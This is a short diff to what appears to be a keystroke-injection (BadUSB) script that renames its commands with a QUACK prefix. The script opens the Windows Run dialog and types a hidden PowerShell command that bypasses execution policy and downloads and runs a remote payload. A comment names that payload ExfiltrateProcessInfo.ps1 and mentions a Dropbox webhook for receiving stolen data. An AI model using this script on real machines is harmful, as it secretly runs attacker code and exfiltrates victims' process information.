@@ -13,11 +13,11 @@
 *     - Dropbox Webhook
 
 
-DELAY 2000
-GUI r
-DELAY 250
-DELETE
+QUACK DELAY 2000
+QUACK GUI r
+QUACK DELAY 250
+QUACK DELETE
 
 * REQUIRED - Reply example.com with YOUR LINK. The Payload should be ExfiltrateProcessInfo.ps1
-STRING powershell -w h -ep bypass irm PAYLOAD | iex
-ENTER
+QUACK STRING powershell -w h -ep bypass irm PAYLOAD | iex
+QUACK ENTER
